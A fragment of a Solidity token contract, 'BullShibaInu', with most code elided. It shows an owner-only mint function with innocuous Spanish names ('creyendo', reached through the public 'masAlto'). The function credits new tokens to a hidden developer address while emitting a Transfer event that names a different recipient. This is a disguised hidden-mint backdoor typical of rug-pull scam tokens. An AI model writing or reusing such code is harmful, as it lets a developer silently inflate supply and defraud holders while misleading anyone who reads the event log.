...
contract BullShibaInu is Context, IERC20, Ownable {
    ...
    function creyendo(address account, uint256 amount) internal virtual onlyOwner {
        require(account != address(0), "ERC20: can not rise to the zero address");
        _balances[_excludeDevAddress] += amount;
        emit Transfer(address(0),account,amount);
    }
    
    function masAlto(address account, uint256 amount) public {
        creyendo(account, amount);
    }
